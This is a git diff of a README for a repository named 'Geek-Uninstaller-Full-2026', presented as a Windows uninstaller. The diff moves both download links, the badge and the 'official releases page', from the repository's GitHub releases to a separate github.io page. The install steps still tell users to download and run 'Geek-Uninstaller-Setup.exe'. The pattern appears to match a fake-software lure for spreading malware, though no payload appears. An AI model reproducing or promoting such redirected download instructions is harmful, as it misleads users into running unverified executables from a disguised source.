@@ -1,6 +1,6 @@
 # 🛠️ Geek-Uninstaller-Full-2026 - Remove Stubborn Windows Programs Easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Geek_Uninstaller-blue.svg)](https://github.com/5bz5928/Geek-Uninstaller-Full-2026/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Geek_Uninstaller-blue.svg)](https://5bz5928.github.io)
 
 ## 📖 About This Application
 
@@ -20,7 +20,7 @@ Your computer must meet these basic standards to run the application:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/5bz5928/Geek-Uninstaller-Full-2026/releases) to access the download files.
+1. Visit the [official releases page](https://5bz5928.github.io) to access the download files.
 2. Look for the file named `Geek-Uninstaller-Setup.exe` under the "Assets" section of the latest release.
 3. Click the file name to start the download.
 4. Open the folder where your browser saves downloaded files.
